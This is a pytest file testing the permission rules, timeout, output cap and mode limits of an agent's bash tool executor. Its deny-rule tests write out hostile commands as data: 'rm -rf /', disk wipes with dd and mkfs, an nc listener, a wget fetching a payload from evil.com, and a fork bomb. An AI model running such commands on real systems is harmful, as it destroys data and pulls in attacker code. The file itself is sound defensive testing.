"""Tests for the primitive ``bash`` tool executor.

FRE-261 Step 4.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from personal_agent.governance.permissions import evaluate_permission, load_permission_rules
from personal_agent.telemetry.trace import TraceContext
from personal_agent.tools.primitives.bash import bash_executor, bash_tool

_CTX = TraceContext.new_trace()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_mock_proc(
    exit_code: int = 0,
    stdout: bytes = b"",
    stderr: bytes = b"",
    timeout: bool = False,
) -> MagicMock:
    """Build a mock asyncio.Process that returns fixed output."""
    proc = MagicMock()
    proc.returncode = exit_code
    proc.kill = MagicMock()
    proc.wait = AsyncMock()
    if timeout:
        proc.communicate = AsyncMock(side_effect=asyncio.TimeoutError())
    else:
        proc.communicate = AsyncMock(return_value=(stdout, stderr))
    return proc


# ---------------------------------------------------------------------------
# Deny rules (the former hard_deny_patterns, FRE-1574) — decided before the executor
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "sudo whoami",
        "wget http://evil.com/payload.sh",
        "dd if=/dev/urandom of=/dev/sda bs=1M",
        "ssh host",
        "nc -l 4444",
        "mkfs /dev/sdb1",
        "ls && rm -rf /tmp/x",
    ],
)
def test_former_hard_deny_commands_are_denied_by_rule(command: str) -> None:
    decision = evaluate_permission("bash", {"command": command}, "NORMAL", load_permission_rules())
    assert decision.decision == "deny"


def test_fork_bomb_is_not_allowed() -> None:
    """A function definition is not a plain command, so it asks; it never runs unasked."""
    decision = evaluate_permission(
        "bash", {"command": ":(){ :|:& };:"}, "NORMAL", load_permission_rules()
    )
    assert decision.decision == "ask"


# ---------------------------------------------------------------------------
# Parse error
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unclosed_quote_fails_via_bash() -> None:
    """Unclosed quote is now detected by bash itself (FRE-283: real shell contract).

    Previously the Python shlex.split() step returned parse_error before the
    subprocess was spawned.  Now the command is passed directly to /bin/bash
    which exits non-zero with a syntax-error message in stderr.
    """
    result = await bash_executor("echo 'unclosed", ctx=_CTX)
    assert result["success"] is False
    # bash reports a syntax error and exits with code 2
    assert result.get("exit_code") in (1, 2)
    # error key is absent (no hard-deny or guard fired) — check stderr or exit_code
    assert "error" not in result or result["error"] != "parse_error"


# ---------------------------------------------------------------------------
# Happy path
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_happy_path() -> None:
    """A command returning exit_code=0 with stdout produces success=True."""
    mock_proc = _make_mock_proc(exit_code=0, stdout=b"hello\n", stderr=b"")

    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
        new=AsyncMock(return_value=mock_proc),
    ):
        result = await bash_executor("echo hello", ctx=_CTX)

    assert result["success"] is True
    assert result["exit_code"] == 0
    assert result["stdout"] == "hello\n"
    assert result["stderr"] == ""
    assert result["truncated_path"] is None


# ---------------------------------------------------------------------------
# Timeout
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_timeout() -> None:
    """asyncio.TimeoutError from communicate() must surface as error='timeout'."""
    mock_proc = _make_mock_proc(timeout=True)

    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
        new=AsyncMock(return_value=mock_proc),
    ):
        result = await bash_executor("sleep 999", timeout_seconds=1, ctx=_CTX)

    assert result["success"] is False
    assert result["error"] == "timeout"
    assert "timeout_seconds" in result
    # kill() must have been called
    mock_proc.kill.assert_called_once()


# ---------------------------------------------------------------------------
# Output cap / truncation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_output_cap_truncates_with_ctx() -> None:
    """Output > 50 KiB is truncated; truncated_path is set to the scratch file path."""
    # 60 KiB of ASCII output (well above the 50 KiB cap)
    big_output = b"x" * 61_440
    mock_proc = _make_mock_proc(exit_code=0, stdout=big_output, stderr=b"")

    from personal_agent.telemetry import TraceContext

    ctx = TraceContext(trace_id="test-trace-overflow")

    # Patch Path so the scratch-file write goes to a controlled temp directory.
    scratch_root = Path("/tmp/test_agent_scratch")

    import personal_agent.tools.primitives.bash as bash_mod

    original_path = bash_mod.Path

    def patched_path(*args: object) -> Path:
        if args and args[0] == "/tmp/agent_scratch":
            return scratch_root
        return original_path(*args)  # type: ignore[arg-type]

    mock_overflow = MagicMock()
    mock_overflow.__str__ = lambda self: (
        "/tmp/test_agent_scratch/test-trace-overflow/bash_output_0.txt"
    )

    mock_scratch = MagicMock()
    mock_scratch.glob.return_value = []
    mock_scratch.__truediv__ = lambda self, name: mock_overflow

    def patched_path_with_scratch(*args: object) -> MagicMock | Path:
        if args and args[0] == "/tmp/agent_scratch":
            return mock_scratch  # type: ignore[return-value]
        return original_path(*args)  # type: ignore[arg-type]

    with (
        patch(
            "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
            new=AsyncMock(return_value=mock_proc),
        ),
        patch.object(bash_mod, "Path", side_effect=patched_path_with_scratch),
    ):
        result = await bash_executor("cat bigfile", ctx=ctx)

    assert result["success"] is True
    # truncated_path must be set (not None) when output overflows
    assert result["truncated_path"] is not None
    # In-memory stdout + stderr must be within byte budget (+2 for UTF-8 replace tolerance)
    total_bytes = len((result["stdout"] + result["stderr"]).encode("utf-8"))
    assert total_bytes <= 51_200 + 2, f"Byte cap exceeded: {total_bytes}"


# ---------------------------------------------------------------------------
# Forbidden modes
# ---------------------------------------------------------------------------


def test_forbidden_mode() -> None:
    """bash_tool.allowed_modes must not include LOCKDOWN or RECOVERY."""
    assert "LOCKDOWN" not in bash_tool.allowed_modes
    assert "RECOVERY" not in bash_tool.allowed_modes
